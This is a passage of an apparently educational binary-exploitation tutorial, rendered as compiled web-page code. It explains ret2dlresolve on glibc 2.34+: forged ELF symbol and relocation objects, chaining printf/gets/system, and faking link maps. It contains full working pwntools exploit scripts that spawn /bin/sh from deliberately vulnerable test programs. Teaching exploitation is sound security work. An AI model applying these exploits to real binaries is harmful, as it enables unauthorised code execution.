is:"}),(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:'DT_SYMTAB = e.dynamic_value_by_tag("DT_SYMTAB")\n'})})]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:"DT_SYMTAB = 0x4003c0\nDT_STRTAB = 0x400420\nDT_JMPREL = 0x4004b8\n\nwritable = 0x404100\n"})}),"\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.code,{children:"writable"})," will be the starting address, and let's start our blob with a ",(0,t.jsx)(n.code,{children:"Elf64_Sym"})," entry. The size of this object is ",(0,t.jsx)(n.code,{children:"0x18"}),", so our object needs to be 0x18-aligned with the start of the symbol table (",(0,t.jsx)(n.code,{children:"DT_SYMTAB"}),"), i.e. ",(0,t.jsx)(n.code,{children:"(addrof_sym - DT_SYMTAB) % 0x18 == 0"}),"."]}),"\n",(0,t.jsxs)(n.p,{children:["Since ",(0,t.jsx)(n.code,{children:"(0x404100 - 0x4003c0) % 0x18 == 8"}),", we need to add ",(0,t.jsx)(n.code,{children:"0x10"})," bytes of padding to the start, so ",(0,t.jsx)(n.code,{children:"addrof_sym = 0x404110"}),":"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:'# 0x404100: padding\npayload = b"\\x00" * 0x10\n# 0x404110: Elf64_Sym\npayload += p32(0xdeadbeef)\t# st_name\npayload += p8(0x12)      # st_info (global(0x10)|function(0x2))\npayload += p8(0)         # st_other\npayload += p16(0)        # st_shndx\npayload += p64(0)        # st_value\npayload += p64(0)        # st_size\n'})}),"\n",(0,t.jsxs)(n.admonition,{type:"info",children:[(0,t.jsxs)(n.p,{children:["Most fields here aren't too relevant, and we can just borrow from other ",(0,t.jsx)(n.em,{children:"dynamic"})," symbol entries:"]}),(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"st_info=0x12"})," indicates it's global (can be referenced anywhere) and a function."]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"st_other=0"})," indicates that the visibility is ",(0,t.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/elf.h#L624",children:"STV_DEFAULT"}),"."]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"st_shndx"}),", ",(0,t.jsx)(n.code,{children:"st_value"}),",",(0,t.jsx)(n.code,{children:"st_size"})," don't matter for a dynamic symbol (these aren't checked as far as I can see)."]}),"\n"]})]}),"\n",(0,t.jsxs)(n.p,{children:["Note that we don't know what ",(0,t.jsx)(n.code,{children:"st_name"})," should be yet, so we'll fill that field in later when we add that string."]}),"\n",(0,t.jsxs)(n.p,{children:["Let's do the same with ",(0,t.jsx)(n.code,{children:"Elf64_Rela"}),":"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:"# 0x404130: Elf64_Rela\npayload += p64(0x404080)    # r_offset\npayload += p32(7)           # r_info.type\npayload += p32((addrof_sym - DT_SYMTAB) // 0x18)   # r_info.sym\npayload += p64(0)           # r_addend\n"})}),"\n",(0,t.jsx)(n.admonition,{type:"info",children:(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"r_offset = 0x404080"})," will be where the function address is written to afterwards. This isn't important, as long as it is writable."]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"r_info.type = 7 (ELF_MACHINE_JMP_SLOT)"})," indicates that this is a GOT entry (i.e. a function entry)."]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"r_info.sym"})," references the symbol table entry we created earlier."]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"r_addend"})," is typically unused on ",(0,t.jsx)(n.code,{children:"x86_64"}),", however we may as well set this to ",(0,t.jsx)(n.code,{children:"0"})]}),"\n"]})}),"\n",(0,t.jsxs)(n.p,{children:["So ",(0,t.jsx)(n.code,{children:"addrof_rela = 0x401030"}),", and since ",(0,t.jsx)(n.code,{children:"Elf64_Rela"})," is also ",(0,t.jsx)(n.code,{children:"0x18"})," bytes, we can verify this is 0x18-aligned with the start of the relocation table (",(0,t.jsx)(n.code,{children:"DT_JMPREL"}),")."]}),"\n",(0,t.jsx)(n.p,{children:"Now we need to add the symbol name. This doesn't need any special alignment, so just append it onto the end:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:'# 0x404148: st_name\npayload += b"system\\x00"\n'})}),"\n",(0,t.jsxs)(n.p,{children:["Now that we know ",(0,t.jsx)(n.code,{children:"addrof_st_name = 0x404148"}),", we can calculate ",(0,t.jsx)(n.code,{children:"st_name"}),"'s offset as ",(0,t.jsx)(n.code,{children:"addrof_st_name - DT_STRTAB"}),"."]}),"\n",(0,t.jsxs)(n.admonition,{type:"info",children:[(0,t.jsx)(n.p,{children:"We can also verify, for the sake of our sanity, that the objects are aligned:"}),(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:"assert (addrof_sym - DT_SYMTAB) % 0x18 == 0\nassert (addrof_rela - DT_JMPREL) % 0x18 == 0\n"})})]}),"\n",(0,t.jsx)(n.p,{children:"Now we can finally calculate:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:"reloc_arg = (addrof_rela - DT_JMPREL) // 0x18\n"})}),"\n",(0,t.jsx)(n.h4,{id:"finishing-the-rop-chain",children:"Finishing the rop chain"}),"\n",(0,t.jsxs)(n.p,{children:["Now that all the objects are constructed, we should be able to resolve the symbol using the dispatcher and ",(0,t.jsx)(n.code,{children:"reloc_arg"}),". Last thing for our payload is we need a ",(0,t.jsx)(n.code,{children:"/bin/sh"})," string, so we can add one onto the end of the blob:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:'# 0x40414f\npayload += b"/bin/sh\\x00"\n'})}),"\n",(0,t.jsx)(n.p,{children:"And now complete the rop chain:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:"rop += p64(pop_rdi) + p64(addrof_binsh)\nrop += p64(dispatcher) + p64(reloc_arg)\n"})}),"\n",(0,t.jsx)(n.p,{children:"And send them off (in the correct order!):"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:'p.send(rop.ljust(0x200, b"\\x00"))\np.send(payload.ljust(0x200, b"\\x00"))\n'})}),"\n",(0,t.jsx)(n.admonition,{type:"info",children:(0,t.jsxs)(n.p,{children:["When sending these, to prevent them from merging into the same ",(0,t.jsx)(n.code,{children:"read"})," call, I padded them to 0x200 bytes. Normally you could use ",(0,t.jsx)(n.code,{children:"p.sendafter()"}),", however nothing's printed in this program. Another, slower way is to just use ",(0,t.jsx)(n.code,{children:"time.sleep()"})," to separate them."]})}),"\n",(0,t.jsx)(n.h4,{id:"full-exploit",children:"Full exploit"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:'#!/usr/bin/python3\nfrom pwn import *\n\ne = context.binary = ELF(\'./vuln\')\np = e.process()\n\npop_rdi = 0x4011c3\npop_rsi_r15 = 0x4011c1\ndispatcher = 0x401020\n\nDT_SYMTAB = 0x4003c0\nDT_STRTAB = 0x400420\nDT_JMPREL = 0x4004b8\n\nwritable = 0x404100\n\naddrof_sym = writable + 0x10\naddrof_rela = writable + 0x30\naddrof_st_name = writable + 0x48\naddrof_binsh = writable + 0x4f\n\nassert (addrof_sym - DT_SYMTAB) % 0x18 == 0\nassert (addrof_rela - DT_JMPREL) % 0x18 == 0\n\n# 0x404100: padding\npayload = b"\\x00" * 0x10\n# 0x404110: Elf64_Sym\npayload += p32(addrof_st_name - DT_STRTAB)\t# st_name\npayload += p8(0)\t\t    # st_info (global(0x10)|function(0x2))\npayload += p8(0)\t\t    # st_other\npayload += p16(0)\t\t    # st_shndx\npayload += p64(0)        \t# st_value\npayload += p64(0)\t\t    # st_size\n# 0x404128: padding\npayload += b"\\x00" * 0x8\n# 0x404130: Elf64_Rela\npayload += p64(0x404080)    # r_offset\npayload += p32(7)           # r_info.type\npayload += p32((addrof_sym - DT_SYMTAB) // 0x18)   # r_info.sym\npayload += p64(0)           # r_addend\n# 0x404148: st_name\npayload += b"system\\x00"\n# 0x40414f\npayload += b"/bin/sh\\x00"\n\nreloc_arg = (addrof_rela - DT_JMPREL) // 0x18\n\nrop  = b"A" * 0x80\nrop += p64(0)   # saved rbp\nrop += p64(pop_rsi_r15) + p64(writable) + p64(0)\nrop += p64(e.sym.read)\nrop += p64(pop_rdi) + p64(addrof_binsh)\nrop += p64(dispatcher) + p64(reloc_arg)\n\np.send(rop.ljust(0x200, b"\\x00"))\np.send(payload.ljust(0x200, b"\\x00"))\n\np.interactive()\n'})}),"\n",(0,t.jsx)(n.h2,{id:"function-oriented-programming",children:"Function-oriented programming"}),"\n",(0,t.jsx)(n.p,{children:"Now onto the first of the 2.34+ techniques. For this, we'll extend the classic ret2dlresolve attack to resolve multiple functions; after all, nothing stops us creating multiple relocation and symbol objects +  chaining them together."}),"\n",(0,t.jsx)(n.h3,{id:"attack-scenario",children:"Attack scenario"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-c",metastring:'title="vuln.c"',children:"#include <unistd.h>\n\nint main() {\n    char buf[0x80];\n    read(0, buf, 0x200);\n}\n"})}),"\n",(0,t.jsxs)(n.p,{children:["Same program as before, except without ",(0,t.jsx)(n.code,{children:"pop rdi ; ret"}),", so calling ",(0,t.jsx)(n.code,{children:"system"})," on its own isn't very useful (as ",(0,t.jsx)(n.code,{children:"rdi=0"})," from the ",(0,t.jsx)(n.code,{children:"read"})," call)."]}),"\n",(0,t.jsx)(n.h3,{id:"arbitrary-write-1",children:"Arbitrary write"}),"\n",(0,t.jsxs)(n.p,{children:["Since we also don't have ",(0,t.jsx)(n.code,{children:"pop rsi ; pop r15 ; ret"}),", we can't simply modify the buffer to point to writable memory. Instead, we can use our control over rbp to point ",(0,t.jsx)(n.code,{children:"buf"})," to arbitrary addresses, then triggering the ",(0,t.jsx)(n.code,{children:"read"}),". Read ",(0,t.jsx)(n.a,{href:"controlling-rbp",children:"here"})," for more."]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (10).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsxs)("p",{children:["Dissassembly of ",(0,t.jsx)("code",{children:"main"})]})})]}),"\n",(0,t.jsxs)(n.p,{children:["Basically, when we return, ",(0,t.jsx)(n.code,{children:"leave"})," is triggered, which pops the saved base pointer into ",(0,t.jsx)(n.code,{children:"rbp"}),", which we overwrite with our overflow. Then we can jump to ",(0,t.jsx)(n.code,{children:"main+8"})," (",(0,t.jsx)(n.code,{children:"0x40112e"}),"), which loads ",(0,t.jsx)(n.code,{children:"[rbp-0x80]"})," into ",(0,t.jsx)(n.code,{children:"rax"}),", then into ",(0,t.jsx)(n.code,{children:"rsi"}),". So if we wanted to write to some address, say ",(0,t.jsx)(n.code,{children:"0x400c00"}),", we could do:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:'rop  = b"a" * 0x80\nrop += p64(0x404c00+0x80)\nrop += p64(0x40112e)\n'})}),"\n",(0,t.jsx)(n.p,{children:"Keep in mind that this will stack pivot to the binary's writable section, so we'll need to write a rop chain for when we return again, along with the ret2dlresolve objects, and leave enough space for the function calls."}),"\n",(0,t.jsx)(n.h3,{id:"ret2gets-payload",children:"ret2gets payload"}),"\n",(0,t.jsxs)(n.p,{children:["So now that we can write to the binary's memory, what rop chain should we aim to construct. We can only chain together function calls, however this can be enough. For example, we can once again employ ",(0,t.jsx)(n.del,{children:"my"})," our beloved ",(0,t.jsx)(n.a,{href:"ret2gets#controlling-rdi",children:"ret2gets"}),"!"]}),"\n",(0,t.jsxs)(n.p,{children:["We'll use the variant which allows for ",(0,t.jsx)(n.code,{children:"rdi"})," control, then call ",(0,t.jsx)(n.code,{children:"system"})," afterwards, however before we can call ",(0,t.jsx)(n.code,{children:"gets"}),", we need a writable address in ",(0,t.jsx)(n.code,{children:"rdi"})," first. Since ",(0,t.jsx)(n.code,{children:"rdi = 0"}),", we can actually ",(0,t.jsx)(n.a,{href:"ret2gets#case-3-rdi-null",children:"call printf"})," to put ",(0,t.jsx)(n.code,{children:"_IO_2_1_stdout_"})," into ",(0,t.jsx)(n.code,{children:"rdi"}),"."]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:'rop = [\n"printf",    # -> rdi = _IO_2_1_stdout_\n"gets",      # -> rdi = _IO_stdfile_0_lock\n"gets",      # -> rdi = _IO_stdfile_0_lock -> "/bin/sh"\n"system",\n]\n'})}),"\n",(0,t.jsx)(n.h3,{id:"exploit-script",children:"Exploit script"}),"\n",(0,t.jsx)(n.p,{children:"Below is a more versatile implementation of ret2dlresolve which automatically generates the objects etc."}),"\n",(0,t.jsxs)(n.p,{children:["Outline of how it works is it calculates the sizes of objects and the addresses of where they should go in advance, then generate the data based on that. It's designed for you to easily be able to switch out the target rop chains, then just use ",(0,t.jsx)(n.code,{children:"gen_payload()"})," with that rop chain, and the address of where it would be."]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:'#!/usr/bin/python3\nfrom pwn import *\nfrom sys import argv\n\ne = context.binary = ELF(\'./vuln\')\np = e.process()\n\ndef gen_payload(rop, addr):\n    DT_SYMTAB = e.dynamic_value_by_tag("DT_SYMTAB")\n    DT_STRTAB = e.dynamic_value_by_tag("DT_STRTAB")\n    DT_JMPREL = e.dynamic_value_by_tag("DT_JMPREL")\n\n    # calculate rop size in advance\n    rop_size = sum(map(lambda x: [8, 16][isinstance(x, str)], rop))\n    dl_data_addr = addr+rop_size\n\n    syms = list(set(filter(lambda x: isinstance(x, str), rop)))\n\n    # calculate where we want to place each object\n    addr_jmprel = DT_JMPREL + align(0x18, dl_data_addr - DT_JMPREL)\n    addr_symtab = DT_SYMTAB + align(0x18, addr_jmprel+len(syms)*0x18 - DT_SYMTAB) + 0x18*4\n    addr_strtab = addr_symtab + len(syms)*0x18\n    addr_got = addr_strtab + sum(map(len, syms)) + len(syms)\n\n    assert (addr_jmprel - DT_JMPREL) % 0x18 == 0\n    assert (addr_symtab - DT_SYMTAB) % 0x18 == 0\n\n    rel_start = (addr_jmprel - DT_JMPREL) // 0x18\n    sym_start   = (addr_symtab - DT_SYMTAB) // 0x18\n    str_start = addr_strtab - DT_STRTAB\n    sym_to_reloc = {}\n\n    jmprel = b""\n    symtab = b""\n    strtab = b""\n    for i, sym in enumerate(syms):\n        # elf64_rela\n        jmprel += p64(addr_got)         # r_offset\n        jmprel += p32(7)                # r_info.type\n        jmprel += p32(sym_start + i)    # r_info.sym\n        jmprel += p64(0)                # r_addend\n        # elf64_sym\n        symtab += p32(str_start + len(strtab))\t# st_name\n        symtab += p8(0x12)\t\t    # st_info (global(0x10)|function(0x2))\n        symtab += p8(0)\t\t        # st_other\n        symtab += p16(0)\t\t    # st_shndx\n        symtab += p64(0)        \t# st_value\n        symtab += p64(0)\t\t    # st_size\n\n        strtab += sym.encode() + b"\\x00"\n\n        sym_to_reloc[sym] = rel_start + i\n\n    dlrop = b""\n    for x in rop:\n        if isinstance(x, str):\n            dlrop += p64(dispatcher) + p64(sym_to_reloc[x])\n        else:\n            dlrop += p64(x)\n    assert len(dlrop) == rop_size\n\n    objects = b""\n    ptr = dl_data_addr\n    for addr, data in [(addr_jmprel, jmprel), (addr_symtab, symtab), (addr_strtab, strtab)]:\n        assert ptr <= addr\n        if ptr < addr:\n            objects += b"X" * (addr - ptr)\n            ptr = addr\n        objects += data\n        ptr += len(data)\n    return dlrop + objects\n\nleave_ret = e.sym.main+35\nret = leave_ret+1\nread_gadget = e.sym.main+8\ndispatcher = 0x401020\n\nwritable = e.got.read\nrsi = writable+0xc00\nrbp = rsi+0x80\n\nrop = [\n    "printf",\n    "gets",\n    "gets",\n    "system",\n]\n\ninitial_rop  = b"a" * 0x80\ninitial_rop += p64(rbp)\ninitial_rop += p64(read_gadget)\np.send(initial_rop.ljust(0x200, b"\\x00"))\n\npayload  = b"b" * 0x80\npayload += p64(0)\npayload += gen_payload(rop, rbp+8)\nassert len(payload) <= 0x200\n\np.send(payload.ljust(0x200, b"\\x00"))\n\n# trigger ret2gets\np.sendline(b"")\np.sendline(b"/bin" + p8(u8(b"/")+1) + b"sh")\n\np.interactive()\n'})}),"\n",(0,t.jsx)(n.h3,{id:"alternative-payloads",children:"Alternative payloads"}),"\n",(0,t.jsx)(n.h4,{id:"general-ret2gets",children:"General ret2gets"}),"\n",(0,t.jsxs)(n.p,{children:["For this program we specifically used the fact that ",(0,t.jsx)(n.code,{children:"rdi = 0"}),", however there's a more ",(0,t.jsx)(n.a,{href:"ret2gets#rand",children:"general payload that uses rand"})," (since ",(0,t.jsx)(n.code,{children:"rand"})," takes no arguments, thus has no ",(0,t.jsx)(n.code,{children:"rdi"})," constraints):"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:'rop = [\n    "rand",    # -> unsafe_state\n    "gets",\n    "gets",\n    "system",\n]\n'})}),"\n",(0,t.jsx)(n.h4,{id:"ret2rand",children:"ret2rand"}),"\n",(0,t.jsxs)(n.p,{children:["In fact, ",(0,t.jsx)(n.code,{children:"rand"})," can be more versatile than just this, and could use it to store our ",(0,t.jsx)(n.code,{children:"/bin/sh"})," string (see more ",(0,t.jsx)(n.a,{href:"../fork_gadget#ret2rand",children:"here"}),"):"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:'rop = [\n    "rand",\n    "gets",\n    "rand",\n    "system",\n]\n...\nextra_data = flat({\n    0x00: b"/bin/sh\\x00",\n    0x10: 0x404008,    # writable address\n    0x18: p32(0),      # TYPE_0\n})\np.sendline(extra_data)\n'})}),"\n",(0,t.jsxs)(n.p,{children:["In fact, the benefit of using this is we're less limited in our writes (for ret2gets, the ",(0,t.jsx)(n.code,{children:"lock.owner"})," needs to be ",(0,t.jsx)(n.code,{children:"THREAD_SELF"}),"), so we can even use ",(0,t.jsx)(n.a,{href:"../setcontext",children:"setcontext"}),"."]}),"\n",(0,t.jsx)(n.h2,{id:"arbitrary-rop-chains",children:"Arbitrary rop chains"}),"\n",(0,t.jsxs)(n.p,{children:["It's all well and good to be able to rop just calling well defined functions, however, what if we were able to force it to resolve ",(0,t.jsx)(n.em,{children:"arbitrary"})," addresses?"]}),"\n",(0,t.jsx)(n.h3,{id:"attack-scenario-1",children:"Attack scenario"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-c",metastring:'title="vuln.c"',children:"#include <unistd.h>\n\nint main() {\n    char buf[0x80];\n    read(0, buf, 0x1337);\n}\n"})}),"\n",(0,t.jsx)(n.p,{children:"Similar setup as before, but instead with a bigger size, which we'll need for later."}),"\n",(0,t.jsx)(n.h3,{id:"deadend-with-r_addend",children:"Deadend with r_addend"}),"\n",(0,t.jsxs)(n.p,{children:["Getting arbitrary gadgets isn't really possible when using the existing link map, as it has a set list of symbols that you're restricted to. One idea you might have is to use the ",(0,t.jsx)(n.code,{children:"r_addend"})," field of your relocation object, which is theoretically added onto the resolved value:"]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (232).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:(0,t.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-runtime.c#L121",children:"Adding r_addend"})})})]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (234).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:(0,t.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/sh/dl-machine.h#L245",children:(0,t.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/sh/dl-machine.h#L245",children:"https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/sh/dl-machine.h#L245"})})})})]}),"\n",(0,t.jsx)(n.p,{children:"The idea here would be that you'd have some symbol you'd resolve, then you can add offsets to the symbol address to produce addresses pointing to arbitrary gadgets."}),"\n",(0,t.jsxs)(n.p,{children:["However, the implementation of ",(0,t.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/C/ident/elf_machine_plt_value",children:"elf_machine_plt_value"})," is architecture specific, so some architectures don't use the ",(0,t.jsx)(n.code,{children:"r_addend"})," at all. Unfortunately, ",(0,t.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/x86_64/dl-machine.h#L235",children:"x86-64"})," is one of these:"]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (233).png",alt:""}),(0,t.jsx)("figcaption",{})]}),"\n",(0,t.jsx)(n.h3,{id:"faking-link-maps",children:"Faking link maps"}),"\n",(0,t.jsxs)(n.p,{children:["So if the link map won't give us the gadgets we want, what if we instead made our own link map! This could allow us to define a symbol table where each entry can be a function ",(0,t.jsx)(n.em,{children:"or"})," a gadget, then we'd resolve each gadget when we wanted to use them."]}),"\n",(0,t.jsxs)(n.p,{children:["For this to work, we'd need to populate ",(0,t.jsx)(n.code,{children:"l->l_addr"})," with a libc address. Normally this would be the base of the library, however any address in libc would work (as long as it's a static offset from the base), as we could just offset from this address to everything else."]}),"\n",(0,t.jsxs)(n.p,{children:["The problem is obviously we don't know any, otherwise we would just rop normally. Instead, we can use an ",(0,t.jsx)(n.em,{children:"existing"})," libc address, such as a GOT entry."]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-c",children:"struct link_map\n  {\n    ElfW(Addr) l_addr;\n    char *l_name;\n    ElfW(Dyn) *l_ld;\n    ...\n  }\n"})}),"\n",(0,t.jsxs)(n.p,{children:["Conveniently ",(0,t.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/include/link.h#L100",children:"l->l_addr"})," is the first field of the link map, so we can just write the rest of the link map directly after some GOT entry, then use the address of said GOT entry as the address of the link map."]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"            |----------------|\n0x404000    |    puts@GOT    |\n            |----------------|\n0x404008    |    read@GOT    |    <--- l_addr\n            |----------------|\n0x404010    |    AAAAAAAA    |    <--- l_name (start of data)\n            |----------------|\n0x404018    |    BBBBBBBB    |\n            |----------------|\n0x404020    |      ...       |\n            |----------------|\n"})}),"\n",(0,t.jsx)(n.h3,{id:"revisiting-_dl_fixup",children:"Revisiting _dl_fixup"}),"\n",(0,t.jsxs)(n.p,{children:["Let's once again walk through ",(0,t.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-runtime.c#L41",children:"_dl_fixup"}),", this time making note of the fields we'll need to fake for our own link map."]}),"\n",(0,t.jsx)(n.h4,{id:"the-tables",children:"The tables"}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/Screenshot 2025-07-22 230859.png",alt:""}),(0,t.jsx)("figcaption",{})]}),"\n",(0,t.jsx)(n.p,{children:"Recall that to lookup a symbol, we need to find:"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:["The symbol entry in ",(0,t.jsx)(n.code,{children:"DT_SYMTAB"})]}),"\n",(0,t.jsxs)(n.li,{children:["The string name in ",(0,t.jsx)(n.code,{children:"DT_STRTAB"})]}),"\n",(0,t.jsxs)(n.li,{children:["The relocation entry in ",(0,t.jsx)(n.code,{children:"DT_JMPREL"})]}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"So these need to be present. Slightly annoyingly, these point to dynamic table entries, rather than the tables themselves:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-c",children:"typedef struct\n{\n  Elf64_Sxword\td_tag;\t\t\t/* Dynamic entry type */\n  union\n    {\n      Elf64_Xword d_val;\t\t/* Integer value */\n      Elf64_Addr d_ptr;\t\t\t/* Address value */\n    } d_un;\n} Elf64_Dyn;\n"})}),"\n",(0,t.jsxs)(n.p,{children:["The ",(0,t.jsx)(n.code,{children:"d_tag"})," just contains a number for the type of entry, which isn't checked by ",(0,t.jsx)(n.code,{children:"_dl_fixup"}),", so we can ignore this. We're interested in ",(0,t.jsx)(n.code,{children:"d_ptr"}),"/",(0,t.jsx)(n.code,{children:"d_val"})," (these refer to the same memory slot, due to the ",(0,t.jsx)(n.code,{children:"union"}),"). So in summary, if ",(0,t.jsx)(n.code,{children:"l_info[...] = ptr"}),", then ",(0,t.jsx)(n.code,{children:"*(ptr + 8)"})," points to the table."]}),"\n",(0,t.jsxs)(n.admonition,{type:"info",children:[(0,t.jsxs)(n.p,{children:["The ",(0,t.jsx)(n.code,{children:"DT_PLTGOT"})," ends up being unused. Normally this would be used to point to the GOT table itself, but since the relocation entries store an address of where their entry should go (",(0,t.jsx)(n.code,{children:"r_offset"}),"), this isn't needed."]}),(0,t.jsxs)(n.p,{children:["And even though it's referenced in the code, it gets optimized out. The only usage of ",(0,t.jsx)(n.code,{children:"pltgot"})," is ",(0,t.jsx)(n.code,{children:"reloc_offset (pltgot, reloc_arg)"}),", and we find that ",(0,t.jsx)(n.code,{children:"reloc_offset"})," is defined as:"]}),(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-c",metastring:'title="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/x86_64/dl-runtime.h#L26"',children:"static inline uintptr_t\nreloc_offset (uintptr_t plt0, uintptr_t pltn)\n{\n  return pltn * sizeof (ElfW(Rela));\n}\n"})}),(0,t.jsxs)(n.p,{children:["This function will be inlined, and since the first argument is unused, ",(0,t.jsx)(n.code,{children:"pltgot"})," is completely useless, and thus the compiler won't bother."]})]}),"\n",(0,t.jsx)(n.h4,{id:"l_ld_readonly",children:"l_ld_readonly"}),"\n",(0,t.jsxs)(n.p,{children:["An extra snag with the tables is with how they're accessed using ",(0,t.jsx)(n.code,{children:"D_PTR"}),":"]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image.png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:(0,t.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/generic/ldsodefs.h#L89",children:(0,t.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/generic/ldsodefs.h#L89",children:"https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/generic/ldsodefs.h#L89"})})})})]}),"\n",(0,t.jsxs)(n.p,{children:["Basically they have the option of being rebased if it's deemed read-only. This would cause the table pointer to get rebased with a libc address, and since we want these to point into the binary's memory, we'll need to set ",(0,t.jsx)(n.code,{children:"l->ld_readonly = 0"}),"."]}),"\n",(0,t.jsx)(n.admonition,{type:"info",children:(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/generic/dl-relocate-ld.h#L23",children:"DL_RO_DYN_SECTION"})," is defined as ",(0,t.jsx)(n.code,{children:"0"})," on most architectures, so this is enough."]})}),"\n",(0,t.jsx)(n.h4,{id:"st_other",children:"st_other"}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (11).png",alt:""}),(0,t.jsx)("figcaption",{})]}),"\n",(0,t.jsxs)(n.p,{children:["Once it finds the tables, we have a choice of whether  ",(0,t.jsx)(n.code,{children:"sym->st_other"})," should be ",(0,t.jsx)(n.code,{children:"STV_DEFAULT=0"})," or not. The default case, is ",(0,t.jsx)(n.code,{children:"sym->st_other == 0"}),", where it will look up the symbol. This is doable, but unnecessariy complex for what we need, as this involves many structures and fields to be set up, such as hash tables."]}),"\n",(0,t.jsxs)(n.p,{children:["Instead, let's look at when ",(0,t.jsx)(n.code,{children:"sym->st_other !=  0"}),":"]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (12).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:(0,t.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-runtime.c#L116",children:(0,t.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-runtime.c#L116",children:"https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-runtime.c#L116"})})})})]}),"\n",(0,t.jsxs)(n.p,{children:["This looks much easier, and after parsing the mcros, we find that all this does is simply rebase the existing ",(0,t.jsx)(n.code,{children:"sym->st_value"})," with ",(0,t.jsx)(n.code,{children:"l->l_addr"}),"!"]}),"\n",(0,t.jsx)(n.admonition,{type:"info",children:(0,t.jsxs)(n.p,{children:["The reason this path exists is because of ",(0,t.jsx)(n.a,{href:"https://docs.oracle.com/cd/E19683-01/816-1386/chapter6-79797/index.html",children:"STV_PROTECTED"})," symbols. These are essentially symbols that, when they're resolved from within the same binary they were defined, they must come from said binary. So all that's needed to resolve the symbol is to rebase it."]})}),"\n",(0,t.jsx)(n.h4,{id:"stt_gnu_ifunc",children:"STT_GNU_IFUNC"}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image 